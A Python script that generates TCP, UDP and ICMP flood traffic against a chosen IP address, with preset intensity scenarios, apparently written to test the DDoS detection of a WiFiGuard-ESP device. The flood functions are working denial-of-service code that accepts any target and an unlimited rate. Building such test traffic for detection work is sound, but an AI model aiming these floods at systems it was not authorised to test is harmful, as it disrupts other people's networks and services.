#!/usr/bin/env python3
"""
DDoS Testing Script for WiFiGuard-ESP
Generates various levels of network traffic to test DDoS detection
"""

import socket
import time
import random
import sys
import argparse
from threading import Thread

def generate_tcp_flood(target_ip, target_port, duration, rate):
    """
    Generate TCP SYN flood (similar to hping3)
    
    Args:
        target_ip: IP address to flood
        target_port: Port to target
        duration: How long to flood (seconds)
        rate: Packets per second
    """
    print(f"🚀 Starting TCP flood: {target_ip}:{target_port}")
    print(f"   Duration: {duration}s | Rate: {rate} pkt/s")
    
    start_time = time.time()
    packets_sent = 0
    
    while time.time() - start_time < duration:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect_ex((target_ip, target_port))
            sock.close()
            packets_sent += 1
            
            # Rate limiting
            if rate > 0:
                time.sleep(1.0 / rate)
                
        except Exception as e:
            pass
    
    elapsed = time.time() - start_time
    actual_rate = packets_sent / elapsed if elapsed > 0 else 0
    print(f"✅ Flood complete: {packets_sent:,} packets in {elapsed:.1f}s ({actual_rate:.0f} pkt/s)")

def generate_udp_flood(target_ip, target_port, duration, rate, packet_size):
    """
    Generate UDP flood
    
    Args:
        target_ip: IP address to flood
        target_port: Port to target
        duration: How long to flood (seconds)
        rate: Packets per second
        packet_size: Size of each packet in bytes
    """
    print(f"🚀 Starting UDP flood: {target_ip}:{target_port}")
    print(f"   Duration: {duration}s | Rate: {rate} pkt/s | Size: {packet_size} bytes")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = bytes(random.getrandbits(8) for _ in range(packet_size))
    
    start_time = time.time()
    packets_sent = 0
    
    while time.time() - start_time < duration:
        try:
            sock.sendto(payload, (target_ip, target_port))
            packets_sent += 1
            
            # Rate limiting
            if rate > 0:
                time.sleep(1.0 / rate)
                
        except Exception as e:
            pass
    
    sock.close()
    elapsed = time.time() - start_time
    actual_rate = packets_sent / elapsed if elapsed > 0 else 0
    print(f"✅ Flood complete: {packets_sent:,} packets in {elapsed:.1f}s ({actual_rate:.0f} pkt/s)")

def generate_icmp_flood(target_ip, duration, rate, packet_size):
    """
    Generate ICMP flood (requires root/sudo)
    
    Args:
        target_ip: IP address to flood
        duration: How long to flood (seconds)
        rate: Packets per second
        packet_size: Size of each packet in bytes
    """
    print(f"🚀 Starting ICMP flood: {target_ip}")
    print(f"   Duration: {duration}s | Rate: {rate} pkt/s | Size: {packet_size} bytes")
    print(f"   ⚠️  Note: ICMP flood requires root privileges!")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        print("❌ ERROR: ICMP flood requires root/sudo privileges")
        return
    
    # Simple ICMP echo request packet
    icmp_type = 8  # Echo request
    icmp_code = 0
    checksum = 0
    identifier = random.randint(0, 65535)
    sequence = 0
    
    start_time = time.time()
    packets_sent = 0
    
    while time.time() - start_time < duration:
        try:
            sequence += 1
            # Build ICMP packet (simplified, checksum is 0)
            header = bytes([icmp_type, icmp_code]) + checksum.to_bytes(2, 'big') + \
                     identifier.to_bytes(2, 'big') + sequence.to_bytes(2, 'big')
            data = bytes(random.getrandbits(8) for _ in range(packet_size - 8))
            packet = header + data
            
            sock.sendto(packet, (target_ip, 0))
            packets_sent += 1
            
            # Rate limiting
            if rate > 0:
                time.sleep(1.0 / rate)
                
        except Exception as e:
            pass
    
    sock.close()
    elapsed = time.time() - start_time
    actual_rate = packets_sent / elapsed if elapsed > 0 else 0
    print(f"✅ Flood complete: {packets_sent:,} packets in {elapsed:.1f}s ({actual_rate:.0f} pkt/s)")

def run_test_scenario(scenario, target_ip):
    """Run predefined test scenarios"""
    
    scenarios = {
        'light': {
            'name': 'Light Traffic (Normal)',
            'description': 'Should NOT trigger DDoS alert',
            'type': 'tcp',
            'port': 80,
            'duration': 20,
            'rate': 50,  # 50 pkt/s = ~1000 packets total
            'packet_size': 64
        },
        'medium': {
            'name': 'Medium Traffic (Gaming/Streaming)',
            'description': 'Should NOT trigger DDoS alert (or low severity)',
            'type': 'tcp',
            'port': 80,
            'duration': 20,
            'rate': 200,  # 200 pkt/s = ~4000 packets total
            'packet_size': 128
        },
        'heavy': {
            'name': 'Heavy Traffic (Suspicious)',
            'description': 'Should trigger MEDIUM severity alert',
            'type': 'tcp',
            'port': 80,
            'duration': 20,
            'rate': 400,  # 400 pkt/s = ~8000 packets total
            'packet_size': 256
        },
        'flood': {
            'name': 'Flood Attack (DDoS)',
            'description': 'Should trigger HIGH/CRITICAL severity alert',
            'type': 'tcp',
            'port': 80,
            'duration': 20,
            'rate': 1000,  # 1000 pkt/s = ~20000 packets total
            'packet_size': 512
        },
        'extreme': {
            'name': 'Extreme Flood (Massive DDoS)',
            'description': 'Should trigger CRITICAL severity alert',
            'type': 'tcp',
            'port': 80,
            'duration': 20,
            'rate': 3000,  # 3000 pkt/s = ~60000 packets total
            'packet_size': 1024
        }
    }
    
    if scenario not in scenarios:
        print(f"❌ Unknown scenario: {scenario}")
        print(f"Available scenarios: {', '.join(scenarios.keys())}")
        return
    
    config = scenarios[scenario]
    
    print("\n" + "="*60)
    print(f"📋 SCENARIO: {config['name']}")
    print(f"📝 {config['description']}")
    print("="*60)
    
    if config['type'] == 'tcp':
        generate_tcp_flood(target_ip, config['port'], config['duration'], config['rate'])
    elif config['type'] == 'udp':
        generate_udp_flood(target_ip, config['port'], config['duration'], config['rate'], config['packet_size'])
    elif config['type'] == 'icmp':
        generate_icmp_flood(target_ip, config['duration'], config['rate'], config['packet_size'])

def main():
    parser = argparse.ArgumentParser(
        description='DDoS Testing Script for WiFiGuard-ESP',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Run predefined scenarios
  python3 tmp_rovodev_ddos_test.py 192.168.1.178 --scenario light
  python3 tmp_rovodev_ddos_test.py 192.168.1.178 --scenario flood
  
  # Custom TCP flood
  python3 tmp_rovodev_ddos_test.py 192.168.1.178 --type tcp --port 80 --duration 20 --rate 1000
  
  # Custom UDP flood
  python3 tmp_rovodev_ddos_test.py 192.168.1.178 --type udp --port 53 --duration 20 --rate 500 --size 512
  
  # ICMP flood (requires sudo)
  sudo python3 tmp_rovodev_ddos_test.py 192.168.1.178 --type icmp --duration 20 --rate 1000

Available scenarios: light, medium, heavy, flood, extreme
        '''
    )
    
    parser.add_argument('target', help='Target IP address')
    parser.add_argument('--scenario', choices=['light', 'medium', 'heavy', 'flood', 'extreme'],
                        help='Predefined test scenario')
    parser.add_argument('--type', choices=['tcp', 'udp', 'icmp'], default='tcp',
                        help='Attack type (default: tcp)')
    parser.add_argument('--port', type=int, default=80,
                        help='Target port (default: 80)')
    parser.add_argument('--duration', type=int, default=20,
                        help='Duration in seconds (default: 20)')
    parser.add_argument('--rate', type=int, default=1000,
                        help='Packets per second (default: 1000, 0=unlimited)')
    parser.add_argument('--size', type=int, default=512,
                        help='Packet size in bytes (default: 512)')
    
    args = parser.parse_args()
    
    print("\n🛡️  WiFiGuard-ESP DDoS Testing Tool")
    print(f"🎯 Target: {args.target}")
    print()
    
    if args.scenario:
        run_test_scenario(args.scenario, args.target)
    else:
        print(f"📋 Custom {args.type.upper()} flood attack")
        if args.type == 'tcp':
            generate_tcp_flood(args.target, args.port, args.duration, args.rate)
        elif args.type == 'udp':
            generate_udp_flood(args.target, args.port, args.duration, args.rate, args.size)
        elif args.type == 'icmp':
            generate_icmp_flood(args.target, args.duration, args.rate, args.size)
    
    print("\n✅ Test complete! Check your WiFiGuard-ESP dashboard for alerts.")
    print("   ESP should complete its 20s capture and send results to Python server.")

if __name__ == '__main__':
    main()
